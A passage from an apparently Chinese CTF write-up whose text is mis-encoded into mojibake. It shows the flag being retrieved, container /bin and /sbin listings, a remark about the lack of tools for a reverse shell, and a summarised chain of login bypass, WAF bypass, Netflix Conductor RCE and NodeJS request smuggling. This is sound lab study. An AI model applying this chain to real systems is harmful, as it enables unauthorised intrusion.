çš„è„šæœ¬ï¼Œä»è€Œæ‰§è¡Œ VPS ä¸Šè®¾ç½®çš„å‘½ä»¤ï¼Œå†ä»è·¯ç”±æ‹¿ flagã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405223858061.png" alt="flag"></p><p><code>flag{81d75716-7389-4ea0-8e48-ff50347a37c2}</code></p><p>å¥½è€¶ï¼</p><hr><p>å¿ƒæ€ç‚¸äº†ï¼Œé¡ºä¾¿çœ‹äº†çœ‹å®ƒçš„ <code>/bin</code> å’Œ <code>/sbin</code> é‡Œæœ‰å•¥ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">total <span class="token number">780</span>lrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> arch -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> ash -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> base64 -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> bbconfig -<span class="token operator">&gt;</span> /bin/busybox-rwxr-xr-x    <span class="token number">1</span> root     root        <span class="token number">796240</span> Jan <span class="token number">24</span>  <span class="token number">2019</span> busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">cat</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">chgrp</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">chmod</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">chown</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> conspy -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">cp</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">date</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">dd</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">df</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">dmesg</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> dnsdomainname -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> dumpkmap -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token builtin class-name">echo</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> ed -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">egrep</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token boolean">false</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> fatattr -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> fdflush -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">fgrep</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> fsync -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> getopt -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">grep</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> gunzip -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">gzip</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">hostname</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> ionice -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> iostat -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> ipcalc -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> kbd_mode -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">kill</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">link</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> linux32 -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> linux64 -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">ln</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> login -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">ls</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> lzop -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> makemime -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">mkdir</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">mknod</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> mktemp -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">more</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">mount</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> mountpoint -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> mpstat -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">mv</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">netstat</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">nice</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> pidof -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">ping</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> ping6 -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> pipe_progress -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">printenv</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">ps</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token builtin class-name">pwd</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> reformime -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">rev</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">rm</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">rmdir</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> run-parts -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">sed</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> setpriv -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> setserial -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">sh</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">sleep</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">stat</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> stty -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">su</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">sync</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">tar</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">touch</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token boolean">true</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">umount</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">uname</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> usleep -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">watch</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> zcat -<span class="token operator">&gt;</span> /bin/busybox</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">total <span class="token number">228</span>lrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> acpid -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> adjtimex -<span class="token operator">&gt;</span> /bin/busybox-rwxr-xr-x    <span class="token number">1</span> root     root        <span class="token number">211304</span> Jan <span class="token number">10</span>  <span class="token number">2019</span> apklrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> arp -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> blkid -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> blockdev -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> depmod -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> fbsplash -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">fdisk</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> findfs -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">fsck</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> fstrim -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> getty -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">halt</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> hdparm -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> hwclock -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">ifconfig</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">ifdown</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> ifenslave -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">ifup</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> init -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> inotifyd -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> insmod -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">ip</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> ipaddr -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> iplink -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> ipneigh -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> iproute -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> iprule -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> iptunnel -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> klogd -<span class="token operator">&gt;</span> /bin/busybox-rwxr-xr-x    <span class="token number">1</span> root     root           <span class="token number">393</span> Mar <span class="token number">19</span>  <span class="token number">2019</span> ldconfiglrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> loadkmap -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> logread -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> losetup -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> lsmod -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> mdev -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> mkdosfs -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> mkfs.vfat -<span class="token operator">&gt;</span> /bin/busybox-rwxr-xr-x    <span class="token number">1</span> root     root         <span class="token number">13968</span> Jan <span class="token number">23</span>  <span class="token number">2019</span> mkmntdirslrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">mkswap</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> modinfo -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> modprobe -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> nameif -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> nologin -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> poweroff -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> raidautorun -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">reboot</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> rmmod -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> route -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> setconsole -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> slattach -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> swapoff -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> <span class="token function">swapon</span> -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> switch_root -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> sysctl -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> syslogd -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> tunctl -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> udhcpc -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> vconfig -<span class="token operator">&gt;</span> /bin/busyboxlrwxrwxrwx    <span class="token number">1</span> root     root            <span class="token number">12</span> May  <span class="token number">9</span>  <span class="token number">2019</span> watchdog -<span class="token operator">&gt;</span> /bin/busybox</code></pre><p>å™¢ï¼Œæœç„¶æ²¡æœ‰ bash, nc, python, perl, etc. è¿™äº›ï¼Œç¡®å®ä¸æ€ä¹ˆæ–¹ä¾¿åå¼¹ shellâ€¦â€¦</p><p><code>ls /etc/*-release</code> çœ‹çœ‹æ˜¯å•¥å‘è¡Œç‰ˆ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">3.9</span>.4<span class="token assign-left variable">NAME</span><span class="token operator">=</span><span class="token string">"Alpine Linux"</span><span class="token assign-left variable">ID</span><span class="token operator">=</span>alpine<span class="token assign-left variable">VERSION_ID</span><span class="token operator">=</span><span class="token number">3.9</span>.4<span class="token assign-left variable">PRETTY_NAME</span><span class="token operator">=</span><span class="token string">"Alpine Linux v3.9"</span><span class="token assign-left variable">HOME_URL</span><span class="token operator">=</span><span class="token string">"https://alpinelinux.org/"</span><span class="token assign-left variable">BUG_REPORT_URL</span><span class="token operator">=</span><span class="token string">"https://bugs.alpinelinux.org/"</span></code></pre><p>Alpine Linux æ–‡æ˜ï¼ˆ</p><br><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å•Šå•Šå•Šå•Šå•Šï¼</p><p>ç»ˆäºå¤ç°å®Œäº†ï¼ï¼</p><p>è¿™é¢˜å¤ªé¡¶äº†ï¼ï¼ï¼</p><p><strong>å†æ¥å›é¡¾ä»¥ä¸‹æ€è·¯ï¼š</strong></p><ol><li>æ ¹æ® <code>/source</code> å®¡è®¡æºç </li><li>åˆ©ç”¨ JavaScript å¼±ç±»å‹ç‰¹æ€§ï¼Œç»•è¿‡ç™»å½•éªŒè¯è·å¾— admin æƒé™</li><li>åˆ©ç”¨ 0.0.0.0ï¼Œé€šè¿‡ <code>/proxy</code> å’Œ <code>/search</code> æ¥å£ç»• WAFï¼Œè®¿é—® <code>/flag</code> æ‹¿ hint</li><li>åœ¨ docker å†…ç½‘æ‰¾ Netflix Conductor æœåŠ¡</li><li>æ‰¾ Netflix Conductor æ¼æ´ï¼Œåˆ©ç”¨ä¸€ä¸ª 1day RCE æ„é€  payload</li><li>åˆ©ç”¨ NodeJS 8 çš„ HTTP è¯·æ±‚èµ°ç§ / è¯·æ±‚æ‹†åˆ†æ¼æ´ï¼Œé€šè¿‡ GET æ–¹æ³•èµ°ç§ POST è¯·æ±‚</li><li>åˆ©ç”¨ <code>/proxy</code> 